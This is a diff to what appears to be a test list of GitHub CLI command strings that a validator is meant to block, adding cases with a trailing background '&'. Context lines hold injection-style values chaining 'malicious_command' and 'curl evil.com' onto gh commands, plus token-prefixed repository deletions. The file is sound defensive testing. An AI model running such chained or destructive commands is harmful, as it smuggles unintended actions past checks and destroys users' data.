@@ -83,6 +83,11 @@ gh pr view 123&malicious
 gh issue list; malicious_command
 gh api /repos/owner/repo; curl evil.com
 
+# Trailing background operator (should be blocked to prevent background execution)
+gh pr view 123 &
+gh pr view 123&
+gh issue list &
+
 # Env var prefix with destructive command (gh command should be extracted and blocked)
 GH_TOKEN=xxx gh repo delete owner/repo
 GH_TOKEN=secret gh api --method DELETE /repos/owner/repo
